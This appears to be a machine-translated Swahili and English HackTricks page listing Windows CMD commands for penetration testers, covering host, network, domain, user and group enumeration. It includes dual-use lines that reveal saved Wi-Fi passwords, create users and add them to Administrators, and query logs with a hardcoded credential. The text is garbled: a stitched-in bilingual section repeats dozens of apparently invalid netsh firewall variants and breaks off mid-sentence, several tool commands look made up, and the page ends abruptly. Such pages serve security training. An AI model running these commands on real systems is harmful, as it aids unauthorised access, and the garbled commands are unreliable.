# Msingi wa CMD wa Win kwa Pentesters

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Habari za mfumo

### Habari za Toleo na Maboresho
```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```
### Mazingira

---

### Basic CMD commands for Windows Pentesters

### Amri za Msingi za CMD kwa Wapenzi wa Windows

---

#### System Information

#### Taarifa za Mfumo

---

##### `systeminfo`

##### `systeminfo`

Displays detailed information about the system, including the operating system version, hardware configuration, and installed hotfixes.

Inaonyesha taarifa za kina kuhusu mfumo, ikiwa ni pamoja na toleo la mfumo wa uendeshaji, muundo wa vifaa, na visasa vilivyosakinishwa.

---

##### `hostname`

##### `hostname`

Displays the name of the current host.

Inaonyesha jina la mwenyeji wa sasa.

---

##### `ipconfig`

##### `ipconfig`

Displays the IP configuration for all network interfaces on the system.

Inaonyesha mipangilio ya IP kwa interfaces zote za mtandao kwenye mfumo.

---

##### `netstat -ano`

##### `netstat -ano`

Displays active network connections, listening ports, and associated processes.

Inaonyesha uhusiano wa mtandao unaofanya kazi, bandari zinazosikiliza, na michakato inayohusiana.

---

##### `route print`

##### `route print`

Displays the IP routing table.

Inaonyesha jedwali la uhamisho wa IP.

---

##### `arp -a`

##### `arp -a`

Displays the ARP (Address Resolution Protocol) cache, which maps IP addresses to MAC addresses.

Inaonyesha akiba ya ARP (Itifaki ya Uamuzi wa Anwani), ambayo inafanya ramani ya anwani za IP kwa anwani za MAC.

---

#### File and Directory Operations

#### Uendeshaji wa Faili na Dirs

---

##### `dir`

##### `dir`

Lists the files and directories in the current directory.

Inaorodhesha faili na directories katika saraka ya sasa.

---

##### `cd`

##### `cd`

Changes the current directory.

Inabadilisha saraka ya sasa.

---

##### `mkdir`

##### `mkdir`

Creates a new directory.

Inaunda saraka mpya.

---

##### `copy`

##### `copy`

Copies a file or multiple files to a specified location.

Inakopi faili au faili nyingi kwenye eneo lililoelezwa.

---

##### `move`

##### `move`

Moves a file or directory to a specified location.

Inahamisha faili au saraka kwenye eneo lililoelezwa.

---

##### `del`

##### `del`

Deletes a file.

Inafuta faili.

---

##### `rmdir`

##### `rmdir`

Deletes an empty directory.

Inafuta saraka tupu.

---

#### Process Management

#### Usimamizi wa Michakato

---

##### `tasklist`

##### `tasklist`

Lists all running processes.

Inaorodhesha michakato yote inayofanya kazi.

---

##### `taskkill`

##### `taskkill`

Terminates a running process.

Inakomesha michakato inayofanya kazi.

---

#### User Management

#### Usimamizi wa Watumiaji

---

##### `net user`

##### `net user`

Lists all user accounts on the system.

Inaorodhesha akaunti zote za watumiaji kwenye mfumo.

---

##### `net user [username]`

##### `net user [jina la mtumiaji]`

Displays detailed information about a specific user account.

Inaonyesha taarifa za kina kuhusu akaunti ya mtumiaji maalum.

---

##### `net localgroup`

##### `net localgroup`

Lists all local groups on the system.

Inaorodhesha vikundi vyote vya ndani kwenye mfumo.

---

##### `net localgroup [groupname]`

##### `net localgroup [jina la kikundi]`

Lists the members of a specific local group.

Inaorodhesha wanachama wa kikundi cha ndani maalum.

---

##### `net group`

##### `net group`

Lists all global groups on the system.

Inaorodhesha vikundi vyote vya kimataifa kwenye mfumo.

---

##### `net group [groupname]`

##### `net group [jina la kikundi]`

Lists the members of a specific global group.

Inaorodhesha wanachama wa kikundi cha kimataifa maalum.

---

#### Network Configuration

#### Mpangilio wa Mtandao

---

##### `netsh interface show interface`

##### `netsh interface show interface`

Displays the status of all network interfaces on the system.

Inaonyesha hali ya interfaces zote za mtandao kwenye mfumo.

---

##### `netsh interface ip show config`

##### `netsh interface ip show config`

Displays the IP configuration for all network interfaces on the system.

Inaonyesha mipangilio ya IP kwa interfaces zote za mtandao kwenye mfumo.

---

##### `netsh wlan show profiles`

##### `netsh wlan show profiles`

Lists all saved Wi-Fi profiles on the system.

Inaorodhesha maelezo yote ya Wi-Fi yaliyohifadhiwa kwenye mfumo.

---

##### `netsh wlan show profile name=[profilename] key=clear`

##### `netsh wlan show profile name=[jina la maelezo] key=clear`

Displays the password of a specific Wi-Fi profile.

Inaonyesha nenosiri la maelezo maalum ya Wi-Fi.

---

##### `netsh advfirewall show currentprofile`

##### `netsh advfirewall show currentprofile`

Displays the current Windows Firewall profile.

Inaonyesha maelezo ya sasa ya Windows Firewall.

---

##### `netsh advfirewall firewall show rule name=all`

##### `netsh advfirewall firewall show rule name=all`

Lists all Windows Firewall rules.

Inaorodhesha sheria zote za Windows Firewall.

---

##### `netsh firewall show state`

##### `netsh firewall show state`

Displays the current state of the Windows Firewall.

Inaonyesha hali ya sasa ya Windows Firewall.

---

##### `netsh firewall show config`

##### `netsh firewall show config`

Displays the configuration of the Windows Firewall.

Inaonyesha mpangilio wa Windows Firewall.

---

##### `netsh firewall show allowedprogram`

##### `netsh firewall show allowedprogram`

Lists all allowed programs in the Windows Firewall.

Inaorodhesha programu zote zilizoruhusiwa kwenye Windows Firewall.

---

##### `netsh firewall show portopening`

##### `netsh firewall show portopening`

Lists all port openings in the Windows Firewall.

Inaorodhesha ufunguzi wote wa bandari kwenye Windows Firewall.

---

##### `netsh firewall show icmpsetting`

##### `netsh firewall show icmpsetting`

Displays the ICMP (Internet Control Message Protocol) settings in the Windows Firewall.

Inaonyesha mipangilio ya ICMP (Itifaki ya Ujumbe wa Kudhibiti wa Mtandao) kwenye Windows Firewall.

---

##### `netsh firewall show service`

##### `netsh firewall show service`

Lists all services allowed through the Windows Firewall.

Inaorodhesha huduma zote zilizoruhusiwa kupitia Windows Firewall.

---

##### `netsh firewall show logging`

##### `netsh firewall show logging`

Displays the logging configuration of the Windows Firewall.

Inaonyesha mpangilio wa kuingiza kumbukumbu ya Windows Firewall.

---

##### `netsh firewall show multicastbroadcastresponse`

##### `netsh firewall show multicastbroadcastresponse`

Displays the multicast and broadcast response settings in the Windows Firewall.

Inaonyesha mipangilio ya majibu ya multicast na utangazaji kwenye Windows Firewall.

---

##### `netsh firewall show notifications`

##### `netsh firewall show notifications`

Displays the notification settings of the Windows Firewall.

Inaonyesha mipangilio ya arifa ya Windows Firewall.

---

##### `netsh firewall show authorizedprogram`

##### `netsh firewall show authorizedprogram`

Lists all authorized programs in the Windows Firewall.

Inaorodhesha programu zote zilizoidhinishwa kwenye Windows Firewall.

---

##### `netsh firewall show globalportopening`

##### `netsh firewall show globalportopening`

Lists all global port openings in the Windows Firewall.

Inaorodhesha ufunguzi wote wa bandari za kimataifa kwenye Windows Firewall.

---

##### `netsh firewall show globalicmpsettings`

##### `netsh firewall show globalicmpsettings`

Displays the global ICMP (Internet Control Message Protocol) settings in the Windows Firewall.

Inaonyesha mipangilio ya ICMP (Itifaki ya Ujumbe wa Kudhibiti wa Mtandao) ya kimataifa kwenye Windows Firewall.

---

##### `netsh firewall show globalfiltering`

##### `netsh firewall show globalfiltering`

Displays the global filtering settings in the Windows Firewall.

Inaonyesha mipangilio ya kuchuja ya kimataifa kwenye Windows Firewall.

---

##### `netsh firewall show globalauthorizedprogram`

##### `netsh firewall show globalauthorizedprogram`

Lists all global authorized programs in the Windows Firewall.

Inaorodhesha programu zote zilizoidhinishwa za kimataifa kwenye Windows Firewall.

---

##### `netsh firewall show global`

##### `netsh firewall show global`

Displays the global configuration of the Windows Firewall.

Inaonyesha mpangilio wa kimataifa wa Windows Firewall.

---

##### `netsh firewall show domainprofile`

##### `netsh firewall show domainprofile`

Displays the configuration of the Windows Firewall for the domain profile.

Inaonyesha mpangilio wa Windows Firewall kwa maelezo ya kikoa.

---

##### `netsh firewall show privateprofile`

##### `netsh firewall show privateprofile`

Displays the configuration of the Windows Firewall for the private profile.

Inaonyesha mpangilio wa Windows Firewall kwa maelezo ya faragha.

---

##### `netsh firewall show publicprofile`

##### `netsh firewall show publicprofile`

Displays the configuration of the Windows Firewall for the public profile.

Inaonyesha mpangilio wa Windows Firewall kwa maelezo ya umma.

---

##### `netsh firewall show rule name=all`

##### `netsh firewall show rule name=all`

Lists all Windows Firewall rules.

Inaorodhesha sheria zote za Windows Firewall.

---

##### `netsh firewall show rule name=[rulename]`

##### `netsh firewall show rule name=[jina la sheria]`

Displays detailed information about a specific Windows Firewall rule.

Inaonyesha taarifa za kina kuhusu sheria maalum ya Windows Firewall.

---

##### `netsh firewall show rule name=[rulename] dir=in`

##### `netsh firewall show rule name=[jina la sheria] dir=in`

Displays detailed information about a specific inbound Windows Firewall rule.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall.

---

##### `netsh firewall show rule name=[rulename] dir=out`

##### `netsh firewall show rule name=[jina la sheria] dir=out`

Displays detailed information about a specific outbound Windows Firewall rule.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall.

---

##### `netsh firewall show rule name=[rulename] dir=in action=allow`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=allow`

Displays detailed information about a specific inbound Windows Firewall rule that allows traffic.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayoruhusu trafiki.

---

##### `netsh firewall show rule name=[rulename] dir=out action=allow`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=allow`

Displays detailed information about a specific outbound Windows Firewall rule that allows traffic.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall inayoruhusu trafiki.

---

##### `netsh firewall show rule name=[rulename] dir=in action=block`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=block`

Displays detailed information about a specific inbound Windows Firewall rule that blocks traffic.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayozuia trafiki.

---

##### `netsh firewall show rule name=[rulename] dir=out action=block`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=block`

Displays detailed information about a specific outbound Windows Firewall rule that blocks traffic.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall inayozuia trafiki.

---

##### `netsh firewall show rule name=[rulename] dir=in action=allow profile=public`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=allow profile=public`

Displays detailed information about a specific inbound Windows Firewall rule that allows traffic for the public profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayoruhusu trafiki kwa maelezo ya umma.

---

##### `netsh firewall show rule name=[rulename] dir=out action=allow profile=public`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=allow profile=public`

Displays detailed information about a specific outbound Windows Firewall rule that allows traffic for the public profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall inayoruhusu trafiki kwa maelezo ya umma.

---

##### `netsh firewall show rule name=[rulename] dir=in action=allow profile=private`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=allow profile=private`

Displays detailed information about a specific inbound Windows Firewall rule that allows traffic for the private profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayoruhusu trafiki kwa maelezo ya faragha.

---

##### `netsh firewall show rule name=[rulename] dir=out action=allow profile=private`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=allow profile=private`

Displays detailed information about a specific outbound Windows Firewall rule that allows traffic for the private profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall inayoruhusu trafiki kwa maelezo ya faragha.

---

##### `netsh firewall show rule name=[rulename] dir=in action=allow profile=domain`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=allow profile=domain`

Displays detailed information about a specific inbound Windows Firewall rule that allows traffic for the domain profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayoruhusu trafiki kwa maelezo ya kikoa.

---

##### `netsh firewall show rule name=[rulename] dir=out action=allow profile=domain`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=allow profile=domain`

Displays detailed information about a specific outbound Windows Firewall rule that allows traffic for the domain profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall inayoruhusu trafiki kwa maelezo ya kikoa.

---

##### `netsh firewall show rule name=[rulename] dir=in action=block profile=public`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=block profile=public`

Displays detailed information about a specific inbound Windows Firewall rule that blocks traffic for the public profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayozuia trafiki kwa maelezo ya umma.

---

##### `netsh firewall show rule name=[rulename] dir=out action=block profile=public`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=block profile=public`

Displays detailed information about a specific outbound Windows Firewall rule that blocks traffic for the public profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall inayozuia trafiki kwa maelezo ya umma.

---

##### `netsh firewall show rule name=[rulename] dir=in action=block profile=private`

##### `netsh firewall show rule name=[jina la sheria] dir=in action=block profile=private`

Displays detailed information about a specific inbound Windows Firewall rule that blocks traffic for the private profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kuingia ya Windows Firewall inayozuia trafiki kwa maelezo ya faragha.

---

##### `netsh firewall show rule name=[rulename] dir=out action=block profile=private`

##### `netsh firewall show rule name=[jina la sheria] dir=out action=block profile=private`

Displays detailed information about a specific outbound Windows Firewall rule that blocks traffic for the private profile.

Inaonyesha taarifa za kina kuhusu sheria maalum ya kutoka ya Windows Firewall
```bash
set #List all environment variables
```
Baadhi ya mazingira ya mazingira ya kuzingatia:

* **COMPUTERNAME**: Jina la kompyuta
* **TEMP/TMP:** Folda ya muda
* **USERNAME:** Jina lako la mtumiaji
* **HOMEPATH/USERPROFILE:** Folda ya nyumbani
* **windir:** C:\Windows
* **OS**: Mfumo wa Uendeshaji wa Windows
* **LOGONSERVER**: Jina la kudhibiti kikoa
* **USERDNSDOMAIN**: Jina la kikoa cha kutumia na DNS
* **USERDOMAIN**: Jina la kikoa
```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```
### Disksi Zilizounganishwa

Unapoendesha amri ya `mount` kwenye mfumo wa Windows, utapata orodha ya diski zilizounganishwa. Hii ni muhimu kwa wapenzi wa udukuzi kwa sababu inaweza kuonyesha diski zilizofichwa au zilizopatikana kwa siri. Kwa kawaida, diski zilizounganishwa zinaonyeshwa kwenye folda ya mizizi (kwa mfano, `C:\`), lakini inawezekana pia kuwa na diski zilizounganishwa kwenye folda zingine.

Kwa mfano, ikiwa unataka kuona diski zilizounganishwa kwenye mfumo wako, unaweza kutumia amri ifuatayo:

```plaintext
wmic logicaldisk get caption, description, providername
```

Amri hii itakupa habari kama vile jina la diski (`caption`), maelezo (`description`), na jina la mtoa huduma (`providername`). Unaweza kutumia habari hii kuchunguza diski zilizounganishwa na kufanya uchunguzi zaidi.
```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```
### [Mlinzi](authentication-credentials-uac-and-efs.md#mlinzi)

### Kikapu cha Kuchakata Tena
```bash
dir C:\$Recycle.Bin /s /b
```
### Mchakato, Huduma & Programu

#### Processes (Mchakato)

Mchakato ni programu inayofanya kazi kwenye mfumo wa uendeshaji. Inaweza kuwa programu ya kawaida au huduma ya mfumo. Mchakato unaweza kuwa na maelezo kama vile kitambulisho cha mchakato (PID), jina la mchakato, na matumizi ya rasilimali kama vile kumbukumbu na CPU.

Kuna njia kadhaa za kuangalia mchakato kwenye Windows:

- **Task Manager**: Unaweza kutumia Task Manager kuchunguza mchakato unaofanya kazi kwenye mfumo wako. Unaweza kuona habari kama vile jina la mchakato, PID, matumizi ya CPU, na kumbukumbu.

- **Command Prompt**: Unaweza kutumia amri kama vile `tasklist` na `taskkill` kwenye Command Prompt kuangalia mchakato na kumaliza mchakato fulani.

#### Services (Huduma)

Huduma ni programu ambayo inafanya kazi kwenye background ya mfumo wa uendeshaji. Huduma zinaweza kuanza wakati mfumo unapoanza au kwa ombi la mtumiaji. Huduma zinaweza kuwa muhimu kwa utendaji wa mfumo au kwa programu maalum.

Unaweza kuangalia huduma zilizosanikishwa kwenye Windows kwa kutumia amri kama vile `services.msc` au `sc query`.

#### Software (Programu)

Programu ni kifurushi cha programu ambacho kinaweza kufanya kazi kwenye mfumo wa uendeshaji. Programu inaweza kuwa programu ya kawaida, programu ya mfumo, au programu maalum iliyoundwa kwa madhumuni fulani.

Kuna njia kadhaa za kuangalia programu zilizosanikishwa kwenye Windows:

- **Control Panel**: Unaweza kutumia Control Panel kuangalia programu zilizosanikishwa kwenye mfumo wako. Unaweza kutumia sehemu kama vile "Programs and Features" au "Uninstall a program" kuona programu zilizosanikishwa.

- **Command Prompt**: Unaweza kutumia amri kama vile `wmic product get name` kwenye Command Prompt kuangalia programu zilizosanikishwa.
```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```
## Taarifa za Kikoa

### Whois

To get information about a domain, you can use the `whois` command. This command allows you to retrieve details such as the domain registrar, registration date, expiration date, and contact information.

```plaintext
whois <domain>
```

### DNS Enumeration

DNS enumeration is the process of gathering information about a domain's DNS records. This can be done using various tools such as `nslookup`, `dig`, or `host`.

```plaintext
nslookup <domain>
```

```plaintext
dig <domain>
```

```plaintext
host <domain>
```

### Zone Transfer

Zone transfer is a method used to replicate DNS records from a primary DNS server to secondary DNS servers. It can be used to gather information about a domain's DNS infrastructure. To perform a zone transfer, you can use the `nslookup` command.

```plaintext
nslookup
> set type=any
> ls -d <domain>
```

### Reverse DNS Lookup

Reverse DNS lookup is the process of finding the domain name associated with an IP address. This can be useful for identifying the owner of a particular IP address. To perform a reverse DNS lookup, you can use the `nslookup` command.

```plaintext
nslookup <IP address>
```

### Subdomain Enumeration

Subdomain enumeration involves discovering subdomains associated with a domain. This can be done using tools such as `Sublist3r`, `Amass`, or `dnsenum`.

```plaintext
sublist3r -d <domain>
```

```plaintext
amass enum -d <domain>
```

```plaintext
dnsenum <domain>
```

### Email Enumeration

Email enumeration is the process of discovering email addresses associated with a domain. This can be done using tools such as `theHarvester`, `Metagoofil`, or `recon-ng`.

```plaintext
theHarvester -d <domain> -l <limit>
```

```plaintext
metagoofil -d <domain> -l <limit>
```

```plaintext
recon-ng
> use recon/domains-hosts/brute_hosts
> set SOURCE <domain>
> run
```

### Web Technologies Enumeration

Web technologies enumeration involves identifying the technologies used by a website. This can be done using tools such as `Wappalyzer`, `BuiltWith`, or `WhatWeb`.

```plaintext
wappalyzer <URL>
```

```plaintext
builtwith <URL>
```

```plaintext
whatweb <URL>
```

### Social Media Enumeration

Social media enumeration involves discovering social media profiles associated with a domain. This can be done using tools such as `Sherlock`, `SocialScan`, or `SpiderFoot`.

```plaintext
sherlock <username>
```

```plaintext
socialscan -u <username>
```

```plaintext
spiderfoot -l <username>
```

### IP Geolocation

IP geolocation is the process of determining the geographical location of an IP address. This can be done using tools such as `ipapi`, `ipinfo`, or `geolocation-db`.

```plaintext
ipapi <IP address>
```

```plaintext
ipinfo <IP address>
```

```plaintext
geolocation-db <IP address>
```

### Cloud/SaaS Enumeration

Cloud/SaaS enumeration involves identifying cloud or SaaS platforms associated with a domain. This can be done using tools such as `CloudEnum`, `CloudMapper`, or `CloudTracker`.

```plaintext
cloudenum <domain>
```

```plaintext
cloudmapper
> discover
> report
```

```plaintext
cloudtracker -d <domain>
```

### Leak Enumeration

Leak enumeration involves searching for leaked data associated with a domain. This can be done using tools such as `Have I Been Pwned`, `Breached`, or `LeakLooker`.

```plaintext
haveibeenpwned -d <domain>
```

```plaintext
breached -d <domain>
```

```plaintext
leaklooker -d <domain>
```

### Conclusion

By performing domain info enumeration, you can gather valuable information about a domain, including its registration details, DNS records, subdomains, email addresses, web technologies, social media profiles, IP geolocation, cloud/SaaS platforms, and potential data leaks. This information can be useful for various purposes, including reconnaissance, vulnerability assessment, and penetration testing.
```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #¬†Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
### Kumbukumbu na Matukio

#### Windows Event Logs

##### System Event Log

The System event log contains information about system events such as device driver failures, system startup and shutdown, and system service failures.

##### Security Event Log

The Security event log contains information about security-related events such as logon attempts, account management, and object access.

##### Application Event Log

The Application event log contains information about application events such as application crashes, software installation, and application errors.

#### Windows Event Viewer

The Windows Event Viewer is a tool that allows you to view and analyze event logs on a Windows system. It provides a graphical interface for searching, filtering, and viewing event log entries.

#### Event ID

An Event ID is a unique identifier assigned to each event in the event log. It helps in identifying specific events and their corresponding details.

#### Event Log Clearing

Event log clearing refers to the process of deleting or removing event log entries. This can be done manually or through automated scripts.

#### Event Log Monitoring

Event log monitoring involves the continuous monitoring of event logs for any suspicious or malicious activities. It helps in detecting and responding to security incidents in a timely manner.

#### Event Log Analysis

Event log analysis involves the examination of event log entries to identify patterns, anomalies, and potential security issues. It helps in understanding the sequence of events and determining the root cause of an incident.

#### Event Log Forwarding

Event log forwarding allows event logs from multiple systems to be collected and forwarded to a central log management system. This helps in centralizing log data and simplifying log analysis and monitoring.

#### Event Log Correlation

Event log correlation involves the analysis of multiple event logs to identify relationships and dependencies between different events. It helps in understanding the complete picture of an incident and identifying any hidden connections.

#### Event Log Retention

Event log retention refers to the practice of storing event log data for a specific period of time. It helps in compliance with regulatory requirements and facilitates forensic investigations.

#### Event Log Backup

Event log backup involves creating a copy of event log data for backup purposes. This helps in preserving event log data in case of system failures or data loss.

#### Event Log Archiving

Event log archiving involves moving event log data to a separate storage location for long-term retention. This helps in freeing up disk space and maintaining a historical record of events.

#### Event Log Analysis Tools

There are various tools available for event log analysis, such as Splunk, ELK Stack, and Windows Event Log Analyzer. These tools provide advanced features for searching, filtering, and visualizing event log data.
```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```
#### List all users

To list all users on the system, you can use the following command:

```bash
net user
```

#### Get detailed information about a specific user

To get detailed information about a specific user, you can use the following command:

```bash
net user <username>
```

Replace `<username>` with the actual username you want to get information about.

#### Create a new user

To create a new user, you can use the following command:

```bash
net user <username> <password> /add
```

Replace `<username>` with the desired username and `<password>` with the desired password for the new user.

#### Delete a user

To delete a user, you can use the following command:

```bash
net user <username> /delete
```

Replace `<username>` with the username of the user you want to delete.

### Groups

#### List all groups

To list all groups on the system, you can use the following command:

```bash
net localgroup
```

#### Get detailed information about a specific group

To get detailed information about a specific group, you can use the following command:

```bash
net localgroup <groupname>
```

Replace `<groupname>` with the actual name of the group you want to get information about.

#### Add a user to a group

To add a user to a group, you can use the following command:

```bash
net localgroup <groupname> <username> /add
```

Replace `<groupname>` with the name of the group and `<username>` with the name of the user you want to add.

#### Remove a user from a group

To remove a user from a group, you can use the following command:

```bash
net localgroup <groupname> <username> /delete
```

Replace `<groupname>` with the name of the group and `<username>` with the name of the user you want to remove.
```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```
### Vikundi

Vikundi ni njia muhimu ya kusimamia ufikiaji wa rasilimali kwenye mfumo wa Windows. Vikundi vinaweza kutumiwa kuweka leseni za ufikiaji kwa watumiaji na vifaa vingine kwenye mtandao. Kuna aina tofauti za vikundi, kama vile vikundi vya watumiaji, vikundi vya kompyuta, na vikundi vya huduma.

#### Vikundi vya Watumiaji

Vikundi vya watumiaji ni vikundi ambavyo hutumiwa kuweka leseni za ufikiaji kwa watumiaji kwenye mfumo wa Windows. Kuna vikundi vya msingi na vikundi vya ziada. Vikundi vya msingi ni pamoja na "Administrators" na "Users", ambapo vikundi vya ziada vinaweza kuundwa kulingana na mahitaji ya mtumiaji.

#### Vikundi vya Kompyuta

Vikundi vya kompyuta ni vikundi ambavyo hutumiwa kuweka leseni za ufikiaji kwa kompyuta kwenye mtandao. Vikundi hivi vinaweza kutumiwa kudhibiti ufikiaji wa watumiaji kwenye kompyuta fulani au kikundi cha kompyuta.

#### Vikundi vya Huduma

Vikundi vya huduma ni vikundi ambavyo hutumiwa kuweka leseni za ufikiaji kwa huduma zilizosanikishwa kwenye mfumo wa Windows. Vikundi hivi vinaweza kutumiwa kudhibiti ufikiaji wa watumiaji kwenye huduma fulani au kikundi cha huduma.
```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```
### Orodhesha vikao

To list sessions, use the following command:

```plaintext
sessions
```

This command will display a list of active sessions.
```
qwinsta
klist sessions
```
### Sera ya Nenosiri

Kuna sera kadhaa za usalama ambazo zinaweza kutekelezwa kwenye mfumo wa Windows ili kuimarisha usalama wa nenosiri. Sera hizi zinaweza kusaidia kuzuia mashambulizi ya kawaida ya kuvunja nenosiri. Hapa kuna sera muhimu za kuzingatia:

- **Urefu wa Nenosiri**: Nenosiri linapaswa kuwa na urefu wa angalau wahusika 8.
- **Complexity**: Nenosiri linapaswa kuwa na aina tofauti za wahusika kama vile herufi kubwa, herufi ndogo, nambari, na alama.
- **Historia ya Nenosiri**: Mfumo unapaswa kuhifadhi kumbukumbu ya nenosiri za zamani ili kuzuia matumizi ya tena ya nenosiri lile lile.
- **Muda wa Kufunga Nenosiri**: Nenosiri linapaswa kubadilishwa mara kwa mara, kwa mfano, kila siku 30.
- **Kizuizi cha Kujaribu Nenosiri**: Mfumo unapaswa kuzuia jaribio la kuingia kwa nenosiri lisilo sahihi kwa idadi iliyopangwa ya mara kabla ya kuzuia akaunti.
- **Kizuizi cha Akaunti**: Akaunti inapaswa kufungwa baada ya idadi iliyopangwa ya majaribio yasiyofanikiwa ya kuingia kwa nenosiri.

Kwa kuzingatia sera hizi za usalama, unaweza kuimarisha usalama wa nenosiri kwenye mfumo wa Windows na kuzuia mashambulizi ya kawaida ya kuvunja nenosiri.
```
net accounts
